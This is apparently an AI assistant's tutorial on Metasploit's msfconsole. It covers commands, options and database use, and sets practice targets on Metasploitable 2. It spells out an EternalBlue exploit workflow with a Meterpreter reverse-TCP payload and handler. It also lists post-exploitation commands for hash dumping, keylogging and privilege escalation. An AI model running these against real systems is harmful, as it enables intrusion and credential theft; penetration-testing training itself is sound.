`msfconsole` is the **primary command-line interface** for the **Metasploit Framework**, the most widely used penetration testing platform. Think of it as the "Swiss Army knife" for security professionals.

## **Starting msfconsole**
```bash
# Basic start
msfconsole

# With quiet mode (fewer banners)
msfconsole -q

# Using a resource script
msfconsole -r /path/to/script.rc

# Starting with a workspace
msfconsole -w myworkspace
```

## **Key msfconsole Commands & Structure**

### **1. Information & Help**
```bash
help                    # Show all commands
help <command>          # Help for specific command
search <term>           # Search modules (exploits, aux, etc)
info <module_path>      # Detailed module info
show options            # Show current module options
show advanced           # Show advanced options
show targets            # Show compatible targets
show payloads           # Show compatible payloads
show exploits           # List all exploit modules
show auxiliary          # List auxiliary modules
show post               # List post-exploitation modules
version                 # Show Metasploit version
```

### **2. Module Management**
```bash
use <module_path>       # Load a module
  # Example: use exploit/windows/smb/ms17_010_eternalblue

back                    # Go back/exit current module
use <number>            # Use module by search index
reload_all              # Reload all modules from disk

# Module Examples:
use auxiliary/scanner/portscan/tcp
use exploit/multi/handler
use post/windows/gather/hashdump
```

### **3. Setting Options**
```bash
set <option> <value>    # Set an option
  # Example: set RHOSTS 192.168.1.100
  # Example: set LHOST 192.168.1.10

setg <option> <value>   # Set GLOBALLY (persists)
unset <option>          # Clear an option
unsetg <option>         # Clear global option

# Common options:
set RHOSTS 192.168.1.0/24   # Target range
set RHOSTS 192.168.1.1-100  # Target range
set RHOSTS file:/path/targets.txt
set RPORT 445
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
set LHOST <your_ip>
```

### **4. Running Modules**
```bash
run                     # Run auxiliary module
exploit                 # Run exploit module
  # or just: run -j     # Run as job (background)

check                   # Check if target is vulnerable (some modules)
jobs                    # List background jobs
jobs -K                 # Kill all jobs
kill <job_id>           # Kill specific job
```

### **5. Database Integration**
```bash
db_status               # Check database connection
hosts                   # List discovered hosts
services                # List discovered services
vulns                   # List vulnerabilities
creds                   # List credentials
loot                    # List captured loot
notes                   # List notes
workspace               # List workspaces
workspace <name>        # Switch workspace
```

### **6. Meterpreter (Post-Exploitation)**
Once you have a Meterpreter session:
```bash
sessions                # List active sessions
sessions -i <id>        # Interact with session
sessions -K             # Kill all sessions

# Inside meterpreter:
sysinfo                 # System information
getuid                  # Current user
getsystem               # Attempt privilege escalation
ps                      # List processes
migrate <pid>           # Migrate to another process
shell                   # Drop to system shell
hashdump                # Dump password hashes
screenshot              # Capture screen
webcam_list             # List webcams
keyscan_start           # Start keylogger
download <file>         # Download file
upload <file> <path>    # Upload file
```

### **7. Resource Scripts**
Create automation scripts:
```bash
# Create .rc file
echo "use exploit/multi/handler" > handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 192.168.1.10" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "exploit -j" >> handler.rc

# Run it
msfconsole -r handler.rc
```

## **Practical Example Workflow**
```bash
# 1. Start msfconsole
msfconsole -q

# 2. Search for a module
search eternalblue

# 3. Use the module
use exploit/windows/smb/ms17_010_eternalblue

# 4. Show and set options
show options
set RHOSTS 192.168.1.105
set LHOST 192.168.1.10
set LPORT 4444

# 5. Check if vulnerable (optional)
check

# 6. Run the exploit
exploit

# 7. If successful, you'll get meterpreter session
meterpreter > sysinfo
meterpreter > getuid
```

## **Tips & Tricks**
```bash
# Tab completion is available
msf6 > use exploit/linux/<TAB><TAB>

# History commands
history
!<number>     # Rerun command from history

# Logging
spool /path/to/log.txt   # Start logging
spool off                # Stop logging

# Database export
db_export -f xml /path/output.xml

# Use API mode for scripting
msfrpcd                  # Start RPC daemon
```

## **Common Modules to Practice With**
```bash
# Against Metasploitable 2:
use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/multi/samba/usermap_script
use auxiliary/scanner/ssh/ssh_login
use exploit/multi/http/php_cgi_arg_injection

# Listeners:
use exploit/multi/handler
```

## **Important Notes**
- **Always test in authorized environments only**
- **Never attack systems you don't own**
- Use `setg` carefully - settings persist
- Always verify your `LHOST` (your IP)
- Consider using `exploit -j` to run in background
- Clean up sessions and jobs when done

Would you like a specific example of using msfconsole against Metasploitable 2, or guidance on a particular type of attack/scan?
